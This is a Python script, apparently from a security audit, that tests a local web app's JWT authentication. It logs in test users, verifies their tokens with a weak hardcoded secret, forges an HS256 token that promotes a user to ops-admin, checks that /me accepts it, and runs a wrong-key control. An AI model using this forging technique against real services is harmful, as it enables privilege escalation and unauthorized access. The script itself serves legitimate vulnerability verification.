"""R2: 身份运行时探测——/login + JWT 验签 + 伪造实验。

① 5 用户登录取真实 JWT，用静态采集到的弱密钥验签（证明密钥正确 + HS256）；
② 伪造实验：用同密钥把普通用户提权为 ops-admin 签发假 token，调 /me 被接受
   => CWE-321 从"静态弱值命中"升级为"可伪造实证"；
③ 阴性对照：错误密钥签发的 token 必须被拒（排除"服务端不验签"的解释）。

产出：out/runtime/identity.json
"""

from __future__ import annotations

import json
import sys
import time
import urllib.request
from pathlib import Path

import jwt

OUT = Path(__file__).resolve().parent.parent / "out" / "runtime"
# 8100 可能被 WinNAT 排除段占用（override 映射为 18100），自动探测
APP_CANDIDATES = ["http://127.0.0.1:8100", "http://127.0.0.1:18100"]
USERS = ["lwang", "zsec", "rdev", "oeng", "root"]


def _pick_app() -> str:
    for base in APP_CANDIDATES:
        try:
            with urllib.request.urlopen(base + "/health", timeout=3) as r:
                if r.status == 200:
                    return base
        except Exception:
            continue
    return APP_CANDIDATES[0]


def _req(app: str, method: str, path: str, body: dict | None = None,
         token: str | None = None) -> tuple[int, dict | str]:
    url = app + path
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method,
                                 headers={"Content-Type": "application/json"})
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status, json.loads(r.read() or b"{}")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")[:200]


def main(secret: str = "change-me-weak-secret") -> int:
    OUT.mkdir(parents=True, exist_ok=True)
    app = _pick_app()
    result = {"logins": {}, "verify": {}, "forge": {}}

    # ① 登录 + 验签
    for user in USERS:
        code, body = _req(app, "POST", "/login", {"username": user})
        entry = {"status": code}
        if code == 200 and isinstance(body, dict):
            token = body.get("access_token", "")
            entry["token_prefix"] = token[:20] + "..."
            try:
                payload = jwt.decode(token, secret, algorithms=["HS256"])
                entry["claims"] = {k: payload[k] for k in ("sub", "role", "team", "scope")}
                entry["verified_with_weak_secret"] = True
            except jwt.InvalidSignatureError:
                entry["verified_with_weak_secret"] = False
        else:
            entry["error"] = body
        result["logins"][user] = entry
    ok_logins = sum(1 for e in result["logins"].values() if e.get("status") == 200)
    verified = sum(1 for e in result["logins"].values() if e.get("verified_with_weak_secret"))
    result["verify"] = {"algorithm": "HS256", "logins_ok": ok_logins,
                        "weak_secret_validates": verified == len(USERS)}

    # ② 伪造：lwang 提权为 ops-admin（跨租户全权限）
    now = int(time.time())
    forged = jwt.encode({"sub": "lwang", "role": "ops-admin", "team": "ops",
                         "scope": {}, "iat": now, "exp": now + 600},
                        secret, algorithm="HS256")
    code, body = _req(app, "GET", "/me", token=forged)
    result["forge"] = {
        "claims_forged": {"sub": "lwang", "role": "ops-admin"},
        "status": code, "accepted": code == 200, "response": body,
    }

    # ③ 阴性对照：错密钥签发必须被拒
    wrong = jwt.encode({"sub": "lwang", "role": "ops-admin", "team": "ops",
                        "scope": {}, "iat": now, "exp": now + 600},
                       "not-the-secret", algorithm="HS256")
    ctl_code, _ = _req(app, "GET", "/me", token=wrong)
    result["forge"]["control_wrong_secret_rejected"] = ctl_code == 401

    path = OUT / "identity.json"
    path.write_text(json.dumps(result, ensure_ascii=False, indent=1), encoding="utf-8")
    print(f"[identity_probe] 登录 {ok_logins}/{len(USERS)}, "
          f"弱密钥验签 {'通过' if verified == len(USERS) else '失败'}, "
          f"伪造token /me => {code} ({'接受' if code == 200 else '拒绝'}), "
          f"阴性对照(错密钥被拒): {result['forge']['control_wrong_secret_rejected']}")
    print(f"-> {path}")
    forge_ok = (ok_logins == len(USERS) and verified == len(USERS)
                and result["forge"]["accepted"]
                and result["forge"]["control_wrong_secret_rejected"])
    return 0 if forge_ok else 1


if __name__ == "__main__":
    sys.exit(main())
